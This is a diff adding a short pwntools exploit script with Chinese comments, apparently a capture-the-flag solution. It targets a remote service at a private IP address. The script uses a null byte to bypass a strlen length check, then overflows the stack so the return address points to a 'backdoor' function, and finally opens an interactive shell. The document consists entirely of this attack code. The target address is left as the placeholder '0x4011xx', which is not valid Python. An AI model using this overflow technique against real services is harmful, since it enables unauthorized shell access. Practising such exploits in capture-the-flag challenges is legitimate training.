@@ -1,0 +1,28 @@
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+
+# 远程连接
+HOST = '10.140.32.159'
+PORT = 47334
+p = remote(HOST, PORT)
+
+# backdoor 地址（请替换为 IDA 中实际显示的地址，例如 0x401186）
+backdoor_addr = 0x4011xx   # 务必替换为真实地址！
+
+# 构造 payload
+payload  = b"meow"             # 前 4 字节必须是 "meow"
+payload += b"\x00"             # \x00 截断 strlen，绕过长度检查
+payload += b"A" * 35           # 填充到返回地址（40 - 5 = 35）
+payload += p64(backdoor_addr)  # 覆盖返回地址为 backdoor
+
+# 发送 str
+p.recvuntil(b"What can u say?")
+p.sendline(payload)
+
+# 发送 n
+p.recvuntil(b"So,what size is it?")
+p.sendline(str(len(payload)).encode())  # n = 48
+
+# 拿到 shell
+p.interactive()
